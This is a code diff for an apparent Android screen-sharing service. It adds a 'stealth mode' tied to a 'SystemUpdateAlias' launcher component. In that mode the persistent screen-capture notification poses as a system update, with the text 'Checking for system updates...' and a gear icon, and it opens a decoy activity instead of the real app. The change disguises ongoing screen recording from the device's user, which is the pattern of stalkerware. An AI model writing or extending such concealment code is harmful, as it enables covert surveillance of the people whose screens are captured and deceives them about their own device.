@@ -75,16 +75,23 @@ public class ScreenShareService extends Service {
         return START_NOT_STICKY;
     }
 
+    private boolean isStealthMode() {
+        android.content.ComponentName fakeAlias = new android.content.ComponentName(this, "com.labs.labrats.SystemUpdateAlias");
+        return getPackageManager().getComponentEnabledSetting(fakeAlias) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
+    }
+
     private void startCapture(int resultCode, Intent data) {
+        boolean stealth = isStealthMode();
+        
         // 1. Create Notification
-        Intent notificationIntent = new Intent(this, MainActivity.class);
+        Intent notificationIntent = new Intent(this, stealth ? DecoyActivity.class : MainActivity.class);
         PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                 PendingIntent.FLAG_IMMUTABLE);
 
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("🛡️ System Link Active")
-                .setContentText("Uplink established...")
-                .setSmallIcon(R.mipmap.ic_launcher)
+                .setContentTitle(stealth ? "System Update" : "🛡️ System Link Active")
+                .setContentText(stealth ? "Checking for system updates..." : "Uplink established...")
+                .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.mipmap.ic_launcher)
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
                 .setPriority(NotificationCompat.PRIORITY_MIN) // Less intrusive
